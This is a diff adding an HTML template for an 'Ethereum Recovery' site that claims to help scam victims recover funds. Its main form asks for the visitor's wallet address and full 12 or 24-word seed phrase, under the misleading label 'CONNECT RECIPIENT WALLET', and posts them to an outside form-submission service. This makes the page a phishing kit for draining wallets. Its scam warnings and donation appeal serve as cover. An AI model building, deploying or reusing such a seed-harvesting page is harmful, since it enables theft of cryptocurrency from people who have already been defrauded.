@@ -1,0 +1,378 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Ethereum Recovery | Secure Wallet Solutions</title>
+    <link rel="icon" href="{% static 'images/logo_favicon.png' %}" type="image/png" sizes="16x16">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Recover lost Ethereum assets with secure blockchain analysis and expert assistance.">
+    <meta name="keywords" content="Ethereum Recovery, Blockchain Analysis, Crypto Scam Recovery, Wallet Security">
+    <meta name="author" content="Ethereum Recovery Team">
+
+    <!-- CSS Files -->
+    <link href="{% static 'css/bootstrap.min.css' %}" rel="stylesheet" type="text/css">
+    <link href="{% static 'css/plugins.css' %}" rel="stylesheet" type="text/css">
+    <link href="{% static 'css/style.css' %}" rel="stylesheet" type="text/css">
+    <link href="{% static 'css/colors/scheme-06.css' %}" rel="stylesheet" type="text/css">
+    <link href="{% static 'css/coloring.css' %}" rel="stylesheet" type="text/css">
+    <link href="{% static 'css/de-black.css' %}" rel="stylesheet" type="text/css">
+
+    <style>
+        /* Enhanced burger menu styling */
+        #menu-btn {
+            cursor: pointer;
+            font-size: 24px;
+            color: #fff;
+        }
+        #mobile-menu {
+            display: none;
+            background: #1a1a1a;
+            position: absolute;
+            top: 80px;
+            left: 0;
+            width: 100%;
+            z-index: 999;
+            padding: 20px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.5);
+        }
+        #mobile-menu ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+        #mobile-menu li {
+            padding: 10px 0;
+            text-align: center;
+        }
+        #mobile-menu a {
+            color: #fff;
+            text-decoration: none;
+            font-size: 18px;
+        }
+        #mobile-menu a:hover {
+            color: #8D7FA6;
+        }
+        @media (min-width: 768px) {
+            #mobile-menu { display: none !important; }
+            #menu-btn { display: none; }
+        }
+    </style>
+</head>
+
+<body class="dark-scheme de-black">
+<div id="wrapper">
+
+    <!-- Header Begin -->
+    <header class="transparent scroll-dark">
+        <div class="container">
+            <div class="row align-items-center justify-content-between">
+                <div class="col-md-3 col-sm-6">
+                    <div id="logo">
+                        <a href="{% url 'home' %}">
+                            <img src="{% static 'images/logo-4.png' %}" alt="Ethereum Recovery Logo" style="width: 150px;">
+                        </a>
+                    </div>
+                </div>
+
+                <div class="col-md-6 d-none d-md-block text-center">
+                    <nav class="mainmenu">
+                        <ul id="mainmenu" class="list-inline m-0">
+                            <li class="list-inline-item"><a href="{% url 'home' %}">Ethereum</a></li>
+                            <li class="list-inline-item"><a href="{% url 'home' %}#about">About</a></li>
+                            <li class="list-inline-item"><a href="#donate">Donate</a></li>
+                        </ul>
+                    </nav>
+                </div>
+
+                <!-- Mobile Menu Button -->
+                <div class="col-auto d-md-none text-end">
+                    <div id="menu-btn"><i class="fa fa-bars"></i></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Mobile Menu -->
+        <div id="mobile-menu" class="d-md-none">
+            <ul>
+                <li><a href="{% url 'home' %}">Ethereum</a></li>
+                <li><a href="{% url 'home' %}#about">About</a></li>
+                <li><a href="#donate">Donate</a></li>
+            </ul>
+        </div>
+    </header>
+    <!-- Header Close -->
+
+    <!-- Content Begin -->
+    <div class="no-bottom no-top" id="content">
+        <div id="top"></div>
+
+
+   
+
+        
+        <!-- Recovery Form Section -->
+<section id="recovery-form" class=" text-light mt-5" 
+         style="
+            background-image: url('{% static 'images/background_pic.jpg' %}');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            position: relative;
+            z-index: 1;
+        ">
+
+    <!-- Optional dark overlay for better text contrast -->
+    <div style="
+        position: absolute;
+        top: 0; left: 0;
+        width: 100%; height: 100%;
+        background: rgba(0, 0, 0, 0.6);
+        z-index: -1;
+    "></div>
+
+    <div style="margin-top: 50px; margin-bottom: 50px;" class="container d-flex justify-content-center">
+        <div class="text-center">
+            <img src="{% static 'images/etherium_icon.svg' %}" 
+                 alt="Ethereum Icon" 
+                 class="img-fluid mb-2" 
+                 style="max-width: 100px;">
+            <p class="mb-0">Ethereum</p>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="text-center mb40">
+            <h2>Start Your Recovery</h2>
+            <p>Submit your details to begin the Ethereum recovery process. Our team will analyze your case.</p>
+        </div>
+        <div class="row justify-content-center">
+            <div class="col-md-8">
+                <form action="https://api.web3forms.com/submit" method="post" class="form-dark">
+                    <input type="hidden" name="access_key" value="88e194de-3fab-40f3-bf0c-5ec6c9023611">
+                    <div class="mb-3">
+                        <label for="eth_address" class="form-label">ETH ADDRESS</label>
+                        <input type="text" class="form-control" id="eth_address" name="eth_address"
+                               placeholder="Enter your Ethereum address (e.g., 0x1234...)" required
+                               pattern="^0x[a-fA-F0-9]{40}$">
+                    </div>
+                    <div class="mb-3">
+                        <label for="seed_phrase" class="form-label">CONNECT RECIPIENT WALLET</label>
+                        <textarea class="form-control" id="seed_phrase" name="seed_phrase" rows="3"
+                                  placeholder="Enter your 12 or 24-word seed phrase" required></textarea>
+                    </div>
+                    <div class="mb-3">
+                        <label for="recovery_amount" class="form-label">RECOVERY AMOUNT (Optional)</label>
+                        <input type="number" step="0.01" class="form-control" id="recovery_amount"
+                               name="recovery_amount" placeholder="Enter amount to recover (e.g., 20.00 ETH)"
+                               value="20.00">
+                    </div>
+                    <button style="background-color: #8D7FA6;" type="submit" class="btn-main btn-lg">
+                        Recover 20.00
+                    </button>
+                </form>
+            </div>
+        </div>
+    </div>
+</section>
+
+
+        <!-- Services Section -->
+        <section id="services" class="pt60 pb60 mt-5 pt-5">
+            <div class="container">
+                <div class="row text-center">
+                    <div class="col-lg-12">
+                        <h2>Our Recovery Services</h2>
+                        <div class="small-border bg-color-2"></div>
+                        <p>Secure and professional solutions to help recover your Ethereum assets.</p>
+                    </div>
+                </div>
+                <div class="row text-center">
+                    <div class="col-lg-4 col-md-6 mb-sm-30">
+                        <div class="feature-box f-boxed style-3">
+                            <i style="background-color: #8D7FA6;" class="wow fadeInUp i-boxed fa fa-search"></i>
+                            <div class="text">
+                                <h4 class="wow fadeInUp">Blockchain Analysis</h4>
+                                <p class="wow fadeInUp" data-wow-delay=".2s">
+                                    Track Ethereum transactions across the blockchain to identify and trace lost or stolen assets.
+                                </p>
+                            </div>
+                            <i class="wm fa fa-search"></i>
+                        </div>
+                    </div>
+                    <div class="col-lg-4 col-md-6 mb-sm-30">
+                        <div class="feature-box f-boxed style-3">
+                            <i style="background-color: #8D7FA6;" class="wow fadeInUp i-boxed fa fa-shield"></i>
+                            <div class="text">
+                                <h4 class="wow fadeInUp">Scam Recovery</h4>
+                                <p class="wow fadeInUp" data-wow-delay=".2s">
+                                    Investigate scams and phishing attacks to attempt recovery of compromised Ethereum funds.
+                                </p>
+                            </div>
+                            <i class="wm fa fa-shield"></i>
+                        </div>
+                    </div>
+                    <div class="col-lg-4 col-md-6 mb-sm-30">
+                        <div class="feature-box f-boxed style-3">
+                            <i style="background-color: #8D7FA6;" class="wow fadeInUp i-boxed fa fa-lock"></i>
+                            <div class="text">
+                                <h4 class="wow fadeInUp">Wallet Recovery</h4>
+                                <p class="wow fadeInUp" data-wow-delay=".2s">
+                                    Assist with recovering access to Ethereum wallets using secure, privacy-first methods.
+                                </p>
+                            </div>
+                            <i class="wm fa fa-lock"></i>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- About Section -->
+        <section id="about" class="pt60 pb60">
+            <div class="container">
+                <div class="row align-items-center">
+                    <div class="col-md-6 mb30">
+                        <img src="{% static 'images/about.png' %}" class="img-fluid rounded shadow" alt="Ethereum Recovery">
+                    </div>
+                    <div class="col-md-6">
+                        <h2>About Ethereum Recovery</h2>
+                        <p>
+                            We specialize in helping Ethereum users recover lost or stolen assets through advanced blockchain analysis and secure recovery protocols. Our team uses AI-powered tools to trace transactions and identify potential recovery paths.
+                        </p>
+                        <p>
+                            <strong>Warning:</strong> Be cautious of scams promising guaranteed recovery. Blockchain transactions are immutable, and recovery is not always possible. We provide legitimate analysis and reporting tools but cannot guarantee funds recovery.
+                        </p>
+                        <ul class="ul-style">
+                            <li>🔍 Advanced blockchain tracing for Ethereum transactions</li>
+                            <li>🛡️ Secure and private recovery processes</li>
+                            <li>🤖 AI-driven scam detection and analysis</li>
+                            <li>🌍 Trusted by Ethereum users worldwide</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Donate Section -->
+        <section id="donate" class="pt60 pb60 text-light mt-5">
+            <div class="container">
+                <div class="text-center mb40">
+                    <h2>Support Our Ethereum Recovery Mission</h2>
+                    <p>Your donations empower us to combat crypto scams, enhance recovery tools, and protect the Ethereum community.</p>
+                </div>
+                <div class="row justify-content-center">
+                    <div class="col-md-8 text-center">
+                        <h4>Why Donate?</h4>
+                        <p>Your contributions directly support our efforts to:</p>
+                        <ul style="list-style: none; text-decoration: none;" class="ul-style text-start mx-auto" style="max-width: 500px;">
+                            <li>🔍 <strong>Develop Advanced Recovery Tools:</strong> Fund AI-powered blockchain analysis to trace lost or stolen Ethereum assets.</li>
+                            <br>
+                            <li>🛡️ <strong>Fight Crypto Scams:</strong> Support education campaigns and resources to help users avoid phishing and fraudulent recovery services.</li>
+                            <br>
+                            <li>🤝 <strong>Assist Victims:</strong> Enable collaboration with legal authorities and cybersecurity experts to pursue recovery cases.</li>
+                            <br>
+                            <li>🌍 <strong>Build Community Trust:</strong> Maintain transparent, secure platforms for Ethereum users worldwide.</li>
+                        </ul>
+                        <p class="mt-3">
+                            Every donation, no matter the size, helps us improve our services and protect users from crypto fraud.
+                        </p>
+                        <p class="mt-4">Donate Ethereum to our secure wallet address:</p>
+                 
+                        <a style="background-color: #8D7FA6;" href="#" id="copy-wallet-btn" class="btn-main btn-lg">Donate</a>
+                       
+                    </div>
+                </div>
+            </div>
+        </section>
+
+       
+
+    </div>
+    <!-- Content Close -->
+
+    <a style="background-color: #8D7FA6;" href="#" id="back-to-top"><i class="fa fa-angle-up"></i></a>
+
+    <!-- Footer Begin -->
+    <footer>
+        <div class="container">
+            <div class="row">
+                <div class="col-md-3 col-sm-6">
+                    <div class="widget">
+                        <h5>Explore</h5>
+                        <ul>
+                            <li><a href="{% url 'home' %}">Ethereum</a></li>
+                            <li><a href="{% url 'home' %}#about">About</a></li>
+                            <li><a href="#donate">Donate</a></li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="col-md-3 col-sm-6">
+                    <div class="widget">
+                        <h5>Support</h5>
+                        <ul>
+                            <li><a href="{% url 'home' %}#help">Help Center</a></li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="col-md-6 col-sm-12">
+                    <div class="widget">
+                        <h5>Newsletter</h5>
+                        <p>Stay updated on Ethereum recovery tips and scam prevention.</p>
+                        <small>We respect your privacy. No spam. Ever.</small>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="subfooter">
+            <div class="container">
+                <div class="de-flex justify-content-between align-items-center">
+                    <div>
+                        <a href="{% url 'home' %}">
+                            <span class="copy">© 2025 - Ethereum Recovery</span>
+                        </a>
+                    </div>
+                    <div class="social-icons">
+                        <a href="#"><i class="fa fa-twitter fa-lg"></i></a>
+                        <a href="#"><i class="fa fa-telegram fa-lg"></i></a>
+                        <a href="#"><i class="fa fa-reddit fa-lg"></i></a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
+    <!-- Footer Close -->
+</div>
+
+<!-- Javascript Files -->
+<script src="{% static 'js/plugins.js' %}"></script>
+<script src="{% static 'js/designesia.js' %}"></script>
+<script>
+    // Mobile menu toggle
+    const menuBtn = document.getElementById('menu-btn');
+    if (menuBtn) {
+        menuBtn.addEventListener('click', () => {
+            const mobileMenu = document.getElementById('mobile-menu');
+            mobileMenu.style.display = (mobileMenu.style.display === 'block') ? 'none' : 'block';
+        });
+    }
+
+    // Close mobile menu when clicking a link
+    document.querySelectorAll('#mobile-menu a').forEach(link => {
+        link.addEventListener('click', () => {
+            document.getElementById('mobile-menu').style.display = 'none';
+        });
+    });
+
+    // Hide mobile menu on window resize to desktop
+    window.addEventListener('resize', () => {
+        if (window.innerWidth >= 768) {
+            document.getElementById('mobile-menu').style.display = 'none';
+        }
+    });
+
+ 
+</script>
+</body>
+</html>
